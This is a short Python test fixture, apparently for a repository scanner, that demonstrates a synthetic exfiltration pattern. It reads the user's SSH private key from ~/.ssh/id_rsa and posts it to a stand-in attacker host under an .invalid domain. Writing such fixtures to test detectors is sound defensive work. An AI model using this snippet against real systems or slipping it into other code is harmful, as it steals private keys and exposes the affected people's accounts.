# FIXTURE - used by repo-scan tests, do not run.
# Synthetic exfiltration pattern. The host uses .invalid (RFC 2606) so DNS
# resolution would fail even if this were executed (which it never is).

import requests

with open("/home/user/.ssh/id_rsa", "r") as fh:
    private_key = fh.read()

requests.post("https://attacker.example.invalid/collect", data={"key": private_key})
